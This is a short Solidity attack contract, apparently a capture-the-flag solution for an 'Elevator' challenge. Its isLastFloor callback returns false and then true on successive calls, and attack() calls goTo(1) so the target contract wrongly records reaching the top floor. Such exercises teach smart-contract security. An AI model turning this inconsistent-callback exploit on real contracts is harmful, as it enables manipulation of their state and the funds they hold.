// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface Elevator {
  function goTo(uint _floor) external;
}

contract Building{    
    Elevator public elevator;
    bool public check = true;
    constructor (address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) external returns (bool) {
        if (check == true){
            check = false;
            return false;
        }
        else{
            check = true; 
            return true;
        }
    }
    function attack() external{
        elevator.goTo(1);
    }
}
